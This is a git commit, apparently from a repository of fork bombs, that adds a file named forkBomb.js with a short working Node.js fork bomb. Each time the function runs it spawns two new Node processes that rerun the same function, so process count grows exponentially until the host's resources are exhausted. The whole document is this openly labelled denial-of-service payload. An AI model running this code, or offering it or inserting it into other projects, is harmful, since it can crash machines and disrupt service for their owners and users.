95ff1117d40f11400342c6eab8e5891aa08b60c2
Maxime Sahroui <maxime.sahroui@gmail.com>
2019-10-01 23:03:12 +0200

    Add a simple forkBomb using Node.js

---
+++ Fork Bomb/forkBomb.js
@@ -0,0 +1,10 @@
+(function f() {
+  require("child_process").spawn(process.argv[0], [
+    "-e",
+    "(" + f.toString() + "());"
+  ]);
+  require("child_process").spawn(process.argv[0], [
+    "-e",
+    "(" + f.toString() + "());"
+  ]);
+})();
